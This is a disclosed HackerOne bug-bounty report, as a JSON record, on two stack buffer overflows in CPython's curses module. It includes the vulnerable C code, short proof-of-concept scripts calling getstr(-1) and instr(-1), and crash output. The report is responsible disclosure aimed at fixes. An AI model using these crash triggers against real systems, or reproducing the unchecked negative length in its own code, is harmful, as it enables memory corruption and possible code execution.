{"id":159690,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk2OTA=","url":"https://hackerone.com/reports/159690","title":"stack buffer overflows in the curses module","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-16T09:19:44.939Z","submitted_at":"2016-08-16T09:19:44.939Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tehybel","url":"/tehybel","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27,"url":"https://hackerone.com/ibb-python","handle":"ibb-python","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Python (IBB)","twitter_handle":"","website":"http://www.python.org/news/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:01:58.772Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:01:50.376Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found two stack buffer overflows in the curses module. These vulnerabilities have been reported to the PSRT and were fixed here:\n\nhttps://hg.python.org/cpython/rev/d5f6bc45b376\nhttps://hg.python.org/cpython/rev/85b35300f200\n\nBelow are copies of the mails I sent to the PSRT. They describe the vulnerabilities in detail.\n\nFirst mail:\n\nI found a straightforward stack buffer overflow in the Modules/\\_cursesmodule.c\nfile. The module implements the python function window.getstr() via the C\nfunction PyCursesWindow_GetStr. This function calls on to the curses library's\nwgetnstr function.\n\nIf we specify a single integer argument to getstr, we hit these lines:\n\n    static PyObject *\n    PyCursesWindow_GetStr(PyCursesWindowObject *self, PyObject *args)\n    {\n        ...\n        char rtn[1024]; /* This should be big enough.. I hope */\n        ...\n        switch (PyTuple_Size(args)) {\n        ...\n        case 1:\n            if (!PyArg_ParseTuple(args,\"i;n\", \u0026n))\n                return NULL;\n            Py_BEGIN_ALLOW_THREADS\n            rtn2 = wgetnstr(self-\u003ewin, rtn, Py_MIN(n, 1023));\n            ...\n        }\n        ...\n    }\n\nAs we can see, the wgetnstr function is called. It will read input into the\nstack buffer \"rtn\". We use wgetnstr rather than wgetstr to prevent a buffer\noverflow. As maximum length we use Py_MIN(n, 1023). However if we set n to be a\nnegative integer, wgetnstr will be passed a negative length.\n\nWhat does the curses module do, then? On my (Linux, ncurses) system it simply\ndoes no length checking. So we can read as many bytes as we want into the\nfixed-size stack buffer rtn.\n\nHere's a proof-of-concept script to reproduce this:\n\n--- begin script ---\n\nimport curses\n\ncurses.initscr()\nw = curses.newwin(80, 80)\nw.getstr(-1)\n\n--- end script ---\n\nHere's the result of running it and entering over 1024 'A's:\n\n$ python3 -c 'print(\"A\"*1100)' | python3 ./poc4.py\n*** stack smashing detected ***: python3 terminated\nzsh: segmentation fault (core dumped)  python3 ./poc4.py\n\n\nThis is clearly exploitable when combined with an info leak that lets us know\nthe stack canary.\n\nThis vulnerability should probably be fixed by making \"n\" unsigned, or by\nconfirming that it is non-negative. (Note that this also needs to be fixed for\nother cases in the switch, like when we input three arguments rather than one.)\n\n\nSome more details about my setup:\n\n    curses version: libncurses (/usr/lib/libncursesw.so.6.0) (ncurses 6.0.20150808)\n    $ python3 -V\n    Python 3.5.2\n\n\n\nSecond mail, after the first vulnerability was fixed:\n\nI just realized that there is a similar vulnerability in the PyCursesWindow_InStr function. There we also need to confirm that n is nonnegative. Otherwise a stack buffer overflow is possible. There's a reproducing script below.\n--- begin script ---\n\nimport curses\n\ncurses.initscr()\nw = curses.newwin(2048, 2048)\ns = w.instr(-1)\n\n--- end script ---\n","vulnerability_information_html":"\u003cp\u003eI found two stack buffer overflows in the curses module. These vulnerabilities have been reported to the PSRT and were fixed here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://hg.python.org/cpython/rev/d5f6bc45b376\" href=\"/redirect?url=https%3A%2F%2Fhg.python.org%2Fcpython%2Frev%2Fd5f6bc45b376\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hg.python.org/cpython/rev/d5f6bc45b376\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://hg.python.org/cpython/rev/85b35300f200\" href=\"/redirect?url=https%3A%2F%2Fhg.python.org%2Fcpython%2Frev%2F85b35300f200\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hg.python.org/cpython/rev/85b35300f200\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBelow are copies of the mails I sent to the PSRT. They describe the vulnerabilities in detail.\u003c/p\u003e\n\n\u003cp\u003eFirst mail:\u003c/p\u003e\n\n\u003cp\u003eI found a straightforward stack buffer overflow in the Modules/_cursesmodule.c\u003cbr\u003e\nfile. The module implements the python function window.getstr() via the C\u003cbr\u003e\nfunction PyCursesWindow_GetStr. This function calls on to the curses library\u0026#39;s\u003cbr\u003e\nwgetnstr function.\u003c/p\u003e\n\n\u003cp\u003eIf we specify a single integer argument to getstr, we hit these lines:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estatic PyObject *\nPyCursesWindow_GetStr(PyCursesWindowObject *self, PyObject *args)\n{\n    ...\n    char rtn[1024]; /* This should be big enough.. I hope */\n    ...\n    switch (PyTuple_Size(args)) {\n    ...\n    case 1:\n        if (!PyArg_ParseTuple(args,\u0026quot;i;n\u0026quot;, \u0026amp;n))\n            return NULL;\n        Py_BEGIN_ALLOW_THREADS\n        rtn2 = wgetnstr(self-\u0026gt;win, rtn, Py_MIN(n, 1023));\n        ...\n    }\n    ...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs we can see, the wgetnstr function is called. It will read input into the\u003cbr\u003e\nstack buffer \u0026quot;rtn\u0026quot;. We use wgetnstr rather than wgetstr to prevent a buffer\u003cbr\u003e\noverflow. As maximum length we use Py_MIN(n, 1023). However if we set n to be a\u003cbr\u003e\nnegative integer, wgetnstr will be passed a negative length.\u003c/p\u003e\n\n\u003cp\u003eWhat does the curses module do, then? On my (Linux, ncurses) system it simply\u003cbr\u003e\ndoes no length checking. So we can read as many bytes as we want into the\u003cbr\u003e\nfixed-size stack buffer rtn.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s a proof-of-concept script to reproduce this:\u003c/p\u003e\n\n\u003cp\u003e--- begin script ---\u003c/p\u003e\n\n\u003cp\u003eimport curses\u003c/p\u003e\n\n\u003cp\u003ecurses.initscr()\u003cbr\u003e\nw = curses.newwin(80, 80)\u003cbr\u003e\nw.getstr(-1)\u003c/p\u003e\n\n\u003cp\u003e--- end script ---\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the result of running it and entering over 1024 \u0026#39;A\u0026#39;s:\u003c/p\u003e\n\n\u003cp\u003e$ python3 -c \u0026#39;print(\u0026quot;A\u0026quot;\u003cem\u003e1100)\u0026#39; | python3 ./poc4.py\u003cbr\u003e\n*\u003c/em\u003e* stack smashing detected ***: python3 terminated\u003cbr\u003e\nzsh: segmentation fault (core dumped)  python3 ./poc4.py\u003c/p\u003e\n\n\u003cp\u003eThis is clearly exploitable when combined with an info leak that lets us know\u003cbr\u003e\nthe stack canary.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability should probably be fixed by making \u0026quot;n\u0026quot; unsigned, or by\u003cbr\u003e\nconfirming that it is non-negative. (Note that this also needs to be fixed for\u003cbr\u003e\nother cases in the switch, like when we input three arguments rather than one.)\u003c/p\u003e\n\n\u003cp\u003eSome more details about my setup:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurses version: libncurses (/usr/lib/libncursesw.so.6.0) (ncurses 6.0.20150808)\n$ python3 -V\nPython 3.5.2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSecond mail, after the first vulnerability was fixed:\u003c/p\u003e\n\n\u003cp\u003eI just realized that there is a similar vulnerability in the PyCursesWindow_InStr function. There we also need to confirm that n is nonnegative. Otherwise a stack buffer overflow is possible. There\u0026#39;s a reproducing script below.\u003cbr\u003e\n--- begin script ---\u003c/p\u003e\n\n\u003cp\u003eimport curses\u003c/p\u003e\n\n\u003cp\u003ecurses.initscr()\u003cbr\u003e\nw = curses.newwin(2048, 2048)\u003cbr\u003e\ns = w.instr(-1)\u003c/p\u003e\n\n\u003cp\u003e--- end script ---\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:01:50.449Z","allow_singular_disclosure_after":-35667284.7229643,"singular_disclosure_allowed":true,"vote_count":2,"voters":["dyabla","dawodshaikh010"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1168450,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-01T20:55:56.023Z","updated_at":"2016-09-01T20:55:56.023Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-python","collaborator":{"username":"tehybel","url":"/tehybel"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1168451,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-01T20:56:01.533Z","updated_at":"2016-09-01T20:56:01.533Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"tehybel","url":"/tehybel"},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025396,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:01:50.392Z","updated_at":"2019-10-13T09:01:50.392Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285224,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:01:58.790Z","updated_at":"2019-11-12T09:01:58.790Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}